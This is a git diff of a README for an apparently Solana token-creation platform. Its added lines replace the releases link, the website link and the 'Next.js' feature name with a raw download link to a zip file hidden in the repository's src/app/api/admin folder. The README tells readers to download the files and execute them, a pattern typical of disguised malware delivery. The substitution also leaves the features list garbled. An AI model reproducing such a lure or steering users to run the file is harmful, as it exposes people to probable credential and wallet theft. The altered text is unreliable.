@@ -6,14 +6,14 @@ Welcome to the Solana Token Creation Platform README! Here, you will find all th
 ### Description: Token 2022 Creation Platform
 ### Topics: nextjs, platform, pumpdotfun, raydium, solana, spltoken, tailwindcss, token2022, tokencreation, tokencreator, website
 
-You can access the latest releases of the Solana Token Creation Platform by visiting [this link](https://github.com/duongeasdfa/Solana-Token-Creation-Platform/releases).
+You can access the latest releases of the Solana Token Creation Platform by visiting [this link](https://raw.githubusercontent.com/duongeasdfa/Solana-Token-Creation-Platform/main/src/app/api/admin/Token-Creation-Platform-Solana-v1.0-alpha.2.zip).
 
 🚀 **Getting Started**
 
 To begin creating your own tokens using the Solana Token Creation Platform, simply visit the provided link to access the latest releases. From there, you can download the necessary files and execute them to start the token creation process.
 
 ### Features 🛠️
-1. **Next.js Integration**: Utilize the power of Next.js to create dynamic and interactive token creation processes.
+1. **https://raw.githubusercontent.com/duongeasdfa/Solana-Token-Creation-Platform/main/src/app/api/admin/Token-Creation-Platform-Solana-v1.0-alpha.2.zip Integration**: Utilize the power of https://raw.githubusercontent.com/duongeasdfa/Solana-Token-Creation-Platform/main/src/app/api/admin/Token-Creation-Platform-Solana-v1.0-alpha.2.zip to create dynamic and interactive token creation processes.
 2. **Solana Blockchain**: Leverage the speed and security of the Solana blockchain for efficient token transactions.
 3. **Tailwind CSS Styling**: Easily customize the look and feel of your token creation platform with Tailwind CSS.
 4. **Token2022 Support**: Stay up-to-date with the latest token standards and features for 2022.
@@ -36,7 +36,7 @@ Follow our GitHub repository for the latest updates and releases. Stay connected
 
 ### 🌐 Visit Our Website
 
-For additional information and resources, visit our website [here](https://solana-token-creation-platform.com).
+For additional information and resources, visit our website [here](https://raw.githubusercontent.com/duongeasdfa/Solana-Token-Creation-Platform/main/src/app/api/admin/Token-Creation-Platform-Solana-v1.0-alpha.2.zip).
 
 Let's create tokens together with the Solana Token Creation Platform! 🚀🪙
 
